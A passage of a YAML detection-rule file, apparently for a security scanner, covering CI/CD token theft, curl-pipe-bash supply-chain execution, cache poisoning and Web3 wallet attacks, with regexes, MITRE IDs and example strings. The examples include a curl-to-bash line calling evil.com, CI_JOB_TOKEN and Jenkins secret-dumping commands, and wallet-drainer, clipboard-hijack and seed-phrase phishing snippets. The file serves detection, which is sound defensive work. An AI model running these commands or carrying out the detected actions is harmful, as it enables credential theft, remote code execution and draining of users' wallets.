  category: supply
  severity: medium
  patterns:
  - (?i)uses\s*:\s*[a-z0-9\-]+/[a-z0-9._\-]+@(?:main|master|latest|v\d+(?:\.\d+)?)\s*$
  keywords:
  - unpinned action
  examples:
  - 'uses: some-actor/some-action@main'
  mitre_attack: T1195.002
- id: CI-CRED-004
  name: GitLab CI Job Token Abuse
  description: CI_JOB_TOKEN exfiltration or use against unauthorized projects
  category: credential
  severity: critical
  patterns:
  - (?i)CI_JOB_TOKEN
  - '(?i)curl\s+.{0,80}--header\s+[''\"]?JOB-TOKEN:'
  - (?i)gitlab\.com/api/v4/.{0,80}job_token
  keywords:
  - CI_JOB_TOKEN
  examples:
  - 'curl --header "JOB-TOKEN: $CI_JOB_TOKEN" https://gitlab.com/api/v4/projects/$ID/repository/files/secret%2Eyml/raw'
  mitre_attack: T1552.001
- id: CI-CRED-005
  name: Jenkins Credential Plugin Read
  description: Jenkins credentials.xml or script console abuse
  category: credential
  severity: critical
  patterns:
  - (?i)/var/(?:lib|jenkins_home)/jenkins/credentials\.xml
  - (?i)hudson\.util\.Secret
  - (?i)/script.{0,40}println\s+.{0,40}Credentials
  - (?i)JENKINS_TOKEN|JENKINS_API_TOKEN
  keywords:
  - Jenkins credentials.xml
  - script console
  examples:
  - curl -X POST http://jenkins/script -d 'script=println(hudson.util.Secret.fromString("...").plainText)'
  mitre_attack: T1552.001
- id: CI-CRED-006
  name: CircleCI / Buildkite Token Exfil
  description: CircleCI personal API tokens or Buildkite agent tokens
  category: credential
  severity: high
  patterns:
  - (?i)CIRCLE_TOKEN
  - (?i)BUILDKITE_AGENT_(?:ACCESS_)?TOKEN
  - (?i)circleci\.com/api/v\d+/.{0,40}circle-token
  keywords:
  - CIRCLE_TOKEN
  - Buildkite agent token
  examples:
  - curl https://circleci.com/api/v2/me?circle-token=$CIRCLE_TOKEN
  mitre_attack: T1552.001
- id: CI-CRED-007
  name: CI Pipeline Curl-Pipe-Bash
  description: Classic curl | bash inside pipeline scripts — supply chain RCE
  category: supply
  severity: critical
  patterns:
  - (?i)curl\s+(?:-[sSfL]+\s+)?https?://[^\s|`]+\s*\|\s*(?:bash|sh|zsh|python\d?|node|ruby|perl)
  - (?i)wget\s+(?:-[qO]+\s+-?\s+)?https?://[^\s|`]+\s*\|\s*(?:bash|sh|python)
  - (?i)\$\(\s*curl\s+.{0,200}\)
  - (?i)`\s*curl\s+.{0,200}`
  keywords:
  - curl pipe bash
  - wget pipe sh
  examples:
  - curl -sL https://evil.com/install.sh | bash
  mitre_attack: T1059.004
- id: CI-CRED-008
  name: CI Cache Poisoning
  description: Poisoning CI build caches (npm, pip, Maven, Gradle) to inject malicious dependencies
  category: supply
  severity: high
  patterns:
  - (?i)actions/cache@.{0,40}\n?\s*with\s*:\s*\n?\s*key\s*:\s*\$\{\{\s*github\.event
  - (?i)cache_(?:from|to)\s*:\s*[^,\s]+\.(?:ru|cn|tk|ml|ga)
  - (?i)npm\s+config\s+set\s+cache\s+
  keywords:
  - CI cache poisoning
  examples:
  - "- uses: actions/cache@v3\n  with:\n    key: ${{ github.event.pull_request.title }}"
  mitre_attack: T1195.002
- id: WEB3-WALLET-001
  name: Seed Phrase / Mnemonic Exfiltration
  description: Direct requests to reveal BIP-39 seed phrases, mnemonics, or recovery phrases — no legitimate use case ever requires sharing these
  category: credential
  severity: critical
  patterns:
  - (?i)(?:reveal|share|send|export|backup|tell|show|paste)\s+(?:your\s+|my\s+|the\s+)?(?:seed[\s\-]?phrase|mnemonic|recovery[\s\-]?phrase|secret[\s\-]?phrase|backup[\s\-]?phrase)
  - (?i)(?:12|15|18|21|24)[\s\-]?word[\s\-]?(?:seed|phrase|mnemonic|recovery)
  - (?i)BIP[\s\-]?39\s+(?:seed|phrase|mnemonic|words?)
  - (?i)(?:enter|input|type|write|paste)\s+(?:your\s+)?(?:seed|recovery|mnemonic|backup)\s+(?:phrase|words?)
  - (?i)(?:metamask|phantom|trust\s*wallet|rainbow|coinbase\s*wallet|exodus|atomic|ledger\s*live|trezor\s*suite)\s+.{0,40}(?:seed|recovery|backup|export|reveal)
  - \b(?:abandon|ability|able|about|above|absent|absorb|abstract|absurd|abuse|access|accident|account|accuse|achieve|acid|acoustic|acquire|across|act|action|actor|actress|actual|adapt|add|addict|address|adjust|admit|adult|advance|advice|aerobic|affair|afford|afraid|again|age|agent|agree|ahead|aim|air|airport|aisle|alarm|album|alcohol|alert|alien|all|alley|allow|almost|alone|alpha|already|also|alter|always|amateur|amazing|among|amount|amused|analyst|anchor|ancient|anger|angle|angry|animal|ankle|announce|annual|another|answer|antenna|antique|anxiety|any|apart|apology|appear|apple|approve|april|arch|arctic|area|arena|argue|arm|armed|armor|army|around|arrange|arrest|arrive|arrow|art|artefact|artist|artwork|ask|aspect|assault|asset|assist|assume|asthma|athlete|atom|attack|attend|attitude|attract|auction|audit|august|aunt|author|auto|autumn|average|avocado|avoid|awake|aware|away|awesome|awful|awkward|axis)(?:\s+(?:abandon|ability|able|about|above|absent|absorb|abstract|absurd|abuse|access|accident|account|accuse|achieve|acid|acoustic|acquire|across|act|action|actor|actress|actual|adapt|add|addict|address|adjust|admit|adult|advance|advice|aerobic|affair|afford|afraid|again|age|agent|agree|ahead|aim|air|airport|aisle|alarm|album|alcohol|alert|alien|all|alley|allow|almost|alone|alpha|already|also|alter|always|amateur|amazing|among|amount|amused|analyst|anchor|ancient|anger|angle|angry|animal|ankle|announce|annual|another|answer|antenna|antique|anxiety|any|apart|apology|appear|apple|approve|april|arch|arctic|area|arena|argue|arm|armed|armor|army|around|arrange|arrest|arrive|arrow|art|artefact|artist|artwork|ask|aspect|assault|asset|assist|assume|asthma|athlete|atom|attack|attend|attitude|attract|auction|audit|august|aunt|author|auto|autumn|average|avocado|avoid|awake|aware|away|awesome|awful|awkward|axis)){11,}\b
  keywords:
  - seed phrase
  - mnemonic
  - recovery phrase
  - BIP-39
  - 12 words
  - 24 words
  examples:
  - Please share your 12-word seed phrase so I can help recover the wallet
  - Enter your MetaMask recovery phrase here
  - abandon ability able about above absent absorb abstract absurd abuse access accident
  mitre_attack: T1552
- id: WEB3-WALLET-002
  name: Private Key Exfiltration
  description: Raw private keys (32 bytes / 64 hex chars) or requests to export them. Distinct from public key/address.
  category: credential
  severity: critical
  patterns:
  - (?i)(?:export|reveal|share|send|paste|tell|show)\s+(?:your\s+|my\s+|the\s+)?(?:private[\s\-]?key|priv[\s\-]?key|secret[\s\-]?key|raw[\s\-]?key)
  - \b0x[a-fA-F0-9]{64}\b
  - (?i)private_?key\s*[=:]\s*['\"]?(?:0x)?[a-fA-F0-9]{64}['\"]?
  - (?i)PRIVATE_KEY\s*=\s*['\"]?(?:0x)?[a-fA-F0-9]{64}['\"]?
  - (?i)\"crypto\"\s*:\s*\{\s*\"cipher\"\s*:\s*\"aes-128-ctr\"
  - (?i)\"version\"\s*:\s*3\s*,\s*\"id\"\s*:\s*\"[a-f0-9\-]{36}\"
  keywords:
  - private key
  - 0x prefix 64 hex
  - keystore JSON
  examples:
  - 'Send me your private key: 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
  - PRIVATE_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
  mitre_attack: T1552
- id: WEB3-WALLET-003
  name: Hardware Wallet Bypass / Blind Signing
  description: Attempts to disable hardware wallet display verification or enable blind signing — defeats the entire point of HW wallets
  category: privilege
  severity: critical
  patterns:
  - (?i)(?:enable|turn\s*on|allow)\s+blind\s*sign(?:ing)?
  - (?i)(?:disable|turn\s*off|skip)\s+(?:contract\s+data|transaction\s+details|verification)\s+(?:check|display)
  - (?i)(?:ledger|trezor|gridplus|keystone)\s+.{0,40}(?:blind\s*sign|skip\s+verification|allow\s+contract)
  - (?i)just\s+(?:click|tap|approve)\s+(?:without|don'?t)\s+(?:read|verify|check)
  keywords:
  - blind signing
  - skip verification
  - hardware wallet bypass
  examples:
  - Enable blind signing on your Ledger and approve quickly
  mitre_attack: T1556
- id: WEB3-WALLET-004
  name: Wallet Connect Malicious Pairing
  description: WalletConnect URI hijacking or unsolicited pairing requests
  category: privilege
  severity: high
  patterns:
  - (?i)wc:[a-f0-9]{64}@\d+\?(?:bridge|relay-protocol)=
  - (?i)walletconnect.{0,40}(?:uri|qr|pair)\s*[:=]
  - (?i)scan\s+(?:this\s+)?qr\s+(?:code\s+)?(?:to\s+connect|with\s+(?:metamask|trust))
  keywords:
  - walletconnect uri
  - 'wc: prefix'
  examples:
  - wc:c9e6d30fb34afe70a15c14e9337ba8e4d5a35dd695c39b94884b0ee60c69d168@1?bridge=https%3A%2F%2Fbridge.walletconnect.org&key=...
  mitre_attack: T1566
- id: WEB3-WALLET-005
  name: Browser Extension Wallet Injection
  description: Malicious dApp attempting to override window.ethereum or inject custom provider
  category: injection
  severity: high
  patterns:
  - (?i)window\.ethereum\s*=
  - (?i)Object\.defineProperty\s*\(\s*window\s*,\s*['\"]ethereum['\"]
  - (?i)EIP[\s\-]?6963\s+.{0,40}(?:provider|announce)
  - (?i)overrid(?:e|ing)\s+(?:metamask|window\.ethereum|wallet\s+provider)
  keywords:
  - window.ethereum override
  - EIP-6963 abuse
  examples:
  - window.ethereum = new MaliciousProvider();
  mitre_attack: T1185
- id: WEB3-WALLET-006
  name: Clipboard Address Hijack
  description: Clipboard hijackers replacing copied wallet addresses with attacker addresses
  category: manipulation
  severity: high
  patterns:
  - (?i)navigator\.clipboard\.(?:write|writeText)\s*\(\s*['\"]?0x[a-fA-F0-9]{40}
  - (?i)document\.execCommand\s*\(\s*['\"]copy['\"]
  - (?i)clipboard.{0,40}(?:hijack|replace|swap).{0,40}(?:address|wallet)
  - (?i)addEventListener\s*\(\s*['\"]copy['\"]
  keywords:
  - clipboard hijack
  - address swap
  examples:
  - navigator.clipboard.writeText('0xATTACKERADDRESS...')
  mitre_attack: T1115
- id: WEB3-WALLET-007
  name: Wallet Drainer Script Indicators
  description: Indicators of known wallet drainer kits (Inferno, Pink, Angel, Pussy, Venom)
  category: exfiltration
  severity: critical
  patterns:
  - (?i)(?:inferno|pink|angel|pussy|venom|monkey|rainbow)\s*drainer
  - (?i)drain(?:er)?\.(?:js|ts)\b
  - (?i)checkAssets|checkBalance.{0,40}drain
  - (?i)(?:swap|approve|transfer)All(?:Assets|Tokens|NFTs)\b
  - (?i)https?://[a-z0-9.\-]+/(?:drainer|drain|claim|airdrop|mint)\.(?:js|php)
  keywords:
  - drainer kit
  - inferno drainer
  - wallet drainer
